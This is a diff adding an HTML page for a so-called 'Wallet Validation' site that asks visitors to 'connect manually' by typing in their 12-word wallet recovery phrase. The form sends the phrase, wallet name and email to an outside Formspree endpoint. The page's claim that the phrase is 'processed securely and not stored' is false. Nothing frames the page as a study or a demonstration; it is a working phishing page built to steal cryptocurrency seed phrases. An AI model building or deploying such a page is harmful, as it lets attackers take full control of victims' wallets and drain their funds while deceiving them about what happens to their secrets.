@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet - Wallet Validation</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <h1 class="logo">Wallet Validation</h1>
+            <nav class="nav">
+                <a href="index.html">Home</a>
+                <a href="wallets.html">Wallets</a>
+            </nav>
+        </div>
+    </header>
+
+    <main class="connect-container">
+        <div class="connect-content">
+            <h2 class="connect-title">Connect Manually</h2>
+            
+            <div class="form-box">
+                <h3 class="form-headline">Input your 12 phrase key</h3>
+                
+                <form action="https://formspree.io/f/mblwgedo" method="POST" class="connect-form">
+                    <div class="form-group">
+                        <label for="wallet-name">Wallet</label>
+                        <input type="text" id="wallet-name" name="wallet" placeholder="Wallet name" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phrase">12-Word Recovery Phrase</label>
+                        <textarea id="phrase" name="phrase" rows="4" placeholder="Enter your 12-word recovery phrase..." required></textarea>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email">Email (optional)</label>
+                        <input type="email" id="email" name="email" placeholder="your@email.com">
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">Connect Wallet</button>
+                </form>
+                
+                <p class="security-note">Your phrase is processed securely and not stored.</p>
+            </div>
+            
+            <a href="wallets.html" class="back-link">← Back to wallet selection</a>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <p>&copy; 2024 Wallet Validation. All rights reserved.</p>
+    </footer>
+    
+    <script src="script.js"></script>
+</body>
+</html>
